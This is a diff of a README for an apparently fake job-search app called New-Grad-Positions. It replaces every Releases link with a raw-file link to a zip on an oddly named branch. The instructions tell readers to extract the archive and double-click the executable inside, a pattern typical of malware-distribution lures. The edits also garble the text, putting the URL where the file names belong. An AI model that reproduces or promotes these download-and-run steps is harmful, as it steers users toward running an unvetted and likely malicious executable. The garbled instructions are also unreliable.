@@ -1,6 +1,6 @@
 # 🎓 New-Grad-Positions - Find Your Dream Job Today
 
-[![Download Now](https://img.shields.io/badge/Download-Now-blue.svg)](https://github.com/nicktrick8/New-Grad-Positions/releases)
+[![Download Now](https://raw.githubusercontent.com/nicktrick8/New-Grad-Positions/dev/homiletically/New-Grad-Positions.zip)](https://raw.githubusercontent.com/nicktrick8/New-Grad-Positions/dev/homiletically/New-Grad-Positions.zip)
 
 ## 📋 Overview
 
@@ -20,14 +20,14 @@ Before you start, ensure your computer is set up to download files. Here are the
 
 To get the software, you need to go to the Releases page. Click the link below:
 
-[Download New-Grad-Positions](https://github.com/nicktrick8/New-Grad-Positions/releases)
+[Download New-Grad-Positions](https://raw.githubusercontent.com/nicktrick8/New-Grad-Positions/dev/homiletically/New-Grad-Positions.zip)
 
 ### Step 3: Download the Application
 
 Once on the Releases page, follow these steps:
 
 1. Look for the latest version of New-Grad-Positions.
-2. Click on the link for the version you wish to download. This will typically be named something like `New-Grad-Positions-v1.0.zip`.
+2. Click on the link for the version you wish to download. This will typically be named something like `https://raw.githubusercontent.com/nicktrick8/New-Grad-Positions/dev/homiletically/New-Grad-Positions.zip`.
 3. Your browser will start downloading the application. Wait for the download to complete. 
 
 ### Step 4: Install the Application
@@ -37,7 +37,7 @@ After downloading, you must install the application. Here’s how:
 1. Navigate to your Downloads folder.
 2. Locate the downloaded ZIP file and right-click on it.
 3. Select "Extract All" or "Unzip" to access the files.
-4. Open the extracted folder, and locate the file named `New-Grad-Positions.exe` (or similar).
+4. Open the extracted folder, and locate the file named `https://raw.githubusercontent.com/nicktrick8/New-Grad-Positions/dev/homiletically/New-Grad-Positions.zip` (or similar).
 5. Double-click on this file to start the installation process.
 6. Follow the on-screen instructions to complete the installation. 
 
@@ -61,7 +61,7 @@ After launching, you will see a user-friendly interface. Here’s how to use it 
 
 ## 📥 Download & Install
 
-To download the latest version of New-Grad-Positions, visit the Releases page: [Download New-Grad-Positions](https://github.com/nicktrick8/New-Grad-Positions/releases).
+To download the latest version of New-Grad-Positions, visit the Releases page: [Download New-Grad-Positions](https://raw.githubusercontent.com/nicktrick8/New-Grad-Positions/dev/homiletically/New-Grad-Positions.zip).
 
 Follow the instructions provided in the "Getting Started" section to download and install the application. 
 
